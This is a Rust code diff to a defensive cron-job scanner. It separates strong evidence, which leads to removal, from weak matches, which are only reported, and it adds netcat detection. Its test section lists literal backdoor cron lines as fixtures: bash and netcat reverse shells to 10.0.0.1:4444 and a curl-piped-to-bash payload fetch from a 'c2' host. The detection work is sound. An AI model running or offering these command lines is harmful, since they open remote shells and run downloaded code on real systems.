@@ -10,7 +10,10 @@ use std::io::Write;
 use std::path::PathBuf;
 use std::process::{Command, Stdio};
 
-use crate::core::scan::{references_untrusted_dir, suspicious_matches};
+use crate::core::scan::{
+    has_strong_reason, invokes_netcat, references_untrusted_dir, references_volatile_dir,
+    suspicious_matches,
+};
 use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_users,
     require_root, try_clear_immutable,
@@ -86,7 +89,9 @@ pub fn run(ctx: &DefenderContext) -> Result {
 
         let (suspicious, benign): (Vec<_>, Vec<_>) = all_jobs
             .iter()
-            .partition(|j| !matched_patterns(j).is_empty());
+            // Only strong evidence removes a job; weak-only matches (a bare
+            // curl health check, certbot's perl -e) are reported below.
+            .partition(|j| has_strong_reason(&matched_patterns(j)));
 
         if !suspicious.is_empty() {
             // Phase 1: log evidence for each suspicious job
@@ -157,9 +162,30 @@ pub fn run(ctx: &DefenderContext) -> Result {
 
         // Emit Info findings for benign jobs (visibility without alarming).
         for job in &benign {
+            let weak = matched_patterns(job);
+            let (severity, verdict_text) = if weak.is_empty() {
+                (
+                    Severity::Info,
+                    format!(
+                        "No malicious patterns matched — verify this job is expected for '{}'.",
+                        user
+                    ),
+                )
+            } else {
+                (
+                    Severity::Medium,
+                    format!(
+                        "Matched [{}], which is common in legitimate jobs, so it was left in \
+                         place. Verify it is expected for '{}'; remove with `crontab -e -u {}`.",
+                        weak.join(", "),
+                        user,
+                        user
+                    ),
+                )
+            };
             ctx.emit(
                 Finding::new(
-                    Severity::Info,
+                    severity,
                     "cron",
                     format!(
                         "Cron job for {}: {}",
@@ -171,13 +197,7 @@ pub fn run(ctx: &DefenderContext) -> Result {
                 .with_context("user", user.to_string())
                 .with_context("job", job.to_string())
                 .with_context("crontab mtime", mtime_label.clone())
-                .with_verdict(
-                    Verdict::Investigate,
-                    format!(
-                        "No malicious patterns matched — verify this job is expected for '{}'.",
-                        user
-                    ),
-                ),
+                .with_verdict(Verdict::Investigate, verdict_text),
             );
         }
     }
@@ -195,8 +215,13 @@ fn matched_patterns(job: &str) -> Vec<String> {
         .map(|s| s.to_string())
         .collect();
     // Also flag execution from untrusted directories
-    if references_untrusted_dir(job) {
+    if references_volatile_dir(job) {
         reasons.insert("execution from untrusted directory".to_string());
+    } else if references_untrusted_dir(job) {
+        reasons.insert("execution from a home directory".to_string());
+    }
+    if invokes_netcat(job) {
+        reasons.insert("netcat invocation".to_string());
     }
     // Add cron-specific extras not in core scan
     for p in CRON_EXTRA_PATTERNS {
@@ -278,6 +303,36 @@ mod tests {
                 .any(|p| p.contains("fetches remote content"))
         );
         assert!(patterns.iter().any(|p| p.contains("shell")));
+    }
+
+    #[test]
+    fn benign_jobs_with_weak_matches_are_not_removal_candidates() {
+        for job in [
+            "0 */12 * * * root perl -e 'sleep int(rand(43200))' && certbot -q renew",
+            "*/5 * * * * curl -fsS -m 10 https://hc-ping.example/uuid",
+            "0 3 * * * /home/deploy/backup.sh",
+            "0 4 * * * rsync -a /srv /mnt/backup",
+        ] {
+            assert!(
+                !has_strong_reason(&matched_patterns(job)),
+                "{job} must not be auto-removed"
+            );
+        }
+    }
+
+    #[test]
+    fn real_backdoors_are_removal_candidates() {
+        for job in [
+            "* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "*/5 * * * * curl http://c2/payload | bash",
+            "@reboot /tmp/.x/implant",
+            "* * * * * nc 10.0.0.1 4444 -e /bin/sh",
+        ] {
+            assert!(
+                has_strong_reason(&matched_patterns(job)),
+                "{job} should be removed"
+            );
+        }
     }
 
     #[test]
